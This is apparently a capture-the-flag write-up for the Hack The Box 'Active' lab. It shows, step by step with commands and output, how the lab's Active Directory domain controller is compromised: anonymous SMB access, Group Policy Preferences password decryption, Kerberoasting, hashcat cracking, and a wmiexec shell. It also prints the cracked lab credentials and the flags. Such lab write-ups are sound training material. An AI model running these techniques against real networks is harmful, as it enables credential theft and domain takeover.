---
title: Hack The Box - CTF Lab - Active - Easy
date: 2025-05-25 00:00:01 +0800
image: /images/thumbnails/Active.png
categories: [HTB Labs]
tags: [CPTS, Easy]
---
Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment.

We of course start with a full nmap scan:
```
sudo nmap -sC -sV -p- 10.10.10.100

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-26 16:18 EDT
Nmap scan report for 10.10.10.100
Host is up (0.028s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-26 20:19:18Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-05-26T20:20:15
|_  start_date: 2025-05-26T19:55:29

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.87 seconds
```
From the nmap scan, we notice that the host is a Domain Controller since it is running LDAP. We also know the OS version is Windows Server 2008 and the domain is active.htb. 

We add the domain name to our /etc/hosts file:
```
10.10.10.100 active.htb
```

Like we did in HTB-Forest, we can try using Impacket's GetNPUsers.py to see if there are any domain users who do not have Kerberos preauthentication enabled which would allow us to access their TGT/hashed password. 

```
GetNPUsers.py -dc-ip 10.10.10.100 -request 'active.htb/'

[-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C09075A, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v1db1
```
Unfortunately we see that the DC does not allow for anonymous binding.

Next, we try testing against the SMB service. 

```
smbclient -N -L //10.10.10.100
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
SMB1 disabled -- no workgroup available
```
We see that anonymous login is successful and we have several shares that are listed. 

We test to see if we can access any of these shares and we do find a share that allows read access:
```
smbclient -N //10.10.10.100/Replication
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  active.htb                          D        0  Sat Jul 21 06:37:44 2018

		5217023 blocks of size 4096. 278565 blocks available
smb: \> 
```
After changing directory to active.htb, we find many files, therefore we download them all recursively with 3 smb commands:
```
smb: \> RECURSE ON 
smb: \> PROMPT OFF
smb: \> mget *

getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.7 KiloBytes/sec) (average 0.2 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (12.5 KiloBytes/sec) (average 2.9 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (3.1 KiloBytes/sec) (average 3.0 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (7.1 KiloBytes/sec) (average 3.4 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (30.3 KiloBytes/sec) (average 5.7 KiloBytes/sec)
```
Once we look through all the files, we see a Guests.xml file:
```
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
with username active.htb\SVC_TGS
and password that looks encrypted:
```
edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

We look this up online and see that it is a Group Policy Preferences (GPP) AES256 encrypted password with a known static key. We can use the tool gpp-decrypt to decrypt this password (https://github.com/t0thkr1s/gpp-decrypt).

We download the gpp-decrypt from the github instructions and use it with python3 to decrypt the password. 
```
sudo python3 gpp-decrypt.py -f ~/Downloads/Groups.xml
/home/kchen/gpp-decrypt/gpp-decrypt.py:10: SyntaxWarning: invalid escape sequence '\ '
  banner = '''

                               __                                __ 
  ___ _   ___    ___  ____ ___/ / ___  ____  ____  __ __   ___  / /_
 / _ `/  / _ \  / _ \/___// _  / / -_)/ __/ / __/ / // /  / _ \/ __/
 \_, /  / .__/ / .__/     \_,_/  \__/ \__/ /_/    \_, /  / .__/\__/ 
/___/  /_/    /_/                                /___/  /_/         

[ * ] Username: active.htb\SVC_TGS
[ * ] Password: GPPstillStandingStrong2k18
```
Now we have the password for the domain TGS service account: GPPstillStandingStrong2k18

Now we can use smbclient again with these credentials to check if we have more shares available:
```
smbclient -L //10.10.10.100 -U SVC_TGS%GPPstillStandingStrong2k18

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
SMB1 disabled -- no workgroup available
```
and we see that we now have the Users share.

We browse to it and find the user flag in the SVC_TGS Desktop folder:
```
09022c4e2bd9be3d687a4c9fd7f4b932
```

### user.txt found

Now that we have a valid service account we can use against the domain controller, we can use Impacket's GetUserSPNs.py to find Service Principal Names that we can extract hashes from:
```
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py active.htb/SVC_TGS:"GPPstillStandingStrong2k18" -dc-ip 10.10.10.100 -request
Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2025-06-05 12:19:06.394967             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$5547b6d6644db00df02367f6509b778c$e22e615faf65d9108975ee9af2ec6afb58c6242b7b954737de163e544418b8ac2c26739c7aee1d463e3bfc65e13586b1319be0bc570017e19d5dbd83d864d77e6e4d5411a1a2a29fa3f9d33b58c87aa8d2c89edd566c3641eeef911d67a5e7dfd6f94b88015b925f54c83cdcd0b3d42d919fc1659aa8b320cc88aeb6043f30a2cdc114d95938b421708442d044437d787e1de563061475398605a1922be2f3be675445b9c3ec08aeb20b693bb85c11b65e29d103589e8f2d2088d8be2c3306d535ffc2064992917ffd776fe30735b7267bced4bd3d3838a27bec9186c40231ef2d865337d2f1b032c4a20577c576f1842c6f5af56feb4c454b02a31353364f74754fbe9ed251e8727840527c3146264b40e2e89b5e0fbc15bfdd8c9aaa258548ab5a450733a6addcbfa314d0e1fbdb9320325b3b7ee2870a0aae37d3316a60795703d5dc6ab23a973298229be4d2af750349e13fcd38c800525b2aa944bb22a1bd72c22448d0fa3268e3148a35063a5d577d0a4d6412a3927a6ab78e0c6ad1cc4d027d8ca87c68339fa5b1a525594ee121f1535809f17e8fdae3724b5a0724253fe47b17b7e6625cccba86df78374ed32fb35a9809dd260fbe909e13f2afca394fcb4aed19bfb96d987454c5c72ab7cdf9efdfa82668a0b12b4928b31e025259ea50fcf6afdea8d57609bf202e5b53adb6db676fc37335f8a3329ec14c8b1a6a71880bab4328a9cad2656489d0b262bd4e25754c1af4ac24473f695d461290622346c3684f6c00f7794f7cdd515551c52a96aeaef0973ea32c137efa2503a32c0457c35d3d292793b482890e43f8c921162b26baedc95880ce955701511bae8ae5f791284f9344fc36d05dd3e88d797869250b40a0ee21edb54b983c9d2e088a62e1ec263164a07fd1fcdaaed0f09c8917d69f1c47fe0a2b9c6fcc398330c390b62b2796d8d5bf9fd72ebff8759f45e91e3e21aab5185c623ba5961cbbf44014f3067dd4d96632d6461163981bff31c45e93e4f416c491672dfa1c5729a0c3af300b5a12d0e8e3fd9331b8649be81cb7c824fd618c62a10e92a3c0fef22a17b5630240d7ce95a4d3ad35d50a6dd7c5d274ad32ddb050834a17b754f64b57c6fe984e4db99377ca48da8f572a00e4de1f748936ee31f88ba144a5b3daad39b649c89267f21b13b1cbd38283e38c625ab4b87275db26f8bd1eaffa404ef7c82eff2dc2ec6e26cc96afb8ac09baaa47390c2e75ab0ac0844f7f83a9
```
As we can see, the SVC_TGS account has the ability to retrieve the hash of the service instance "Administrator," which we can use for privilege escalation. 

Now we can use hashcat with the rockyou.txt wordlist to crack the hash for the administrator service:
```
sudo hashcat -m 13100 hash.txt rockyou.txt 

Ticketmaster1968
```

We now have the SPN Administrator and password Ticketmaster1968, meaning we have successfully privilege escalated to the domain controller's administrator account.

The SSH port 22 is closed on the domain controller, but we see that windows RPC service is open at port 135. This means we can use wmiexec.py to remote into the machine. 

We now can get the final flag:
```
python3 wmiexec.py Administrator@10.10.10.100

Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
C:\Users\Administrator\Desktop>type root.txt
fd01772fad9d6f9fb97bde4fd02abcd9
```

### root.txt found	

In summary, we found an insecure smb server with hashed credentials that we cracked using gpp-decrypt, giving us control to a ticket granting service account which contained access to the hashed credentials of the domain administrator account. 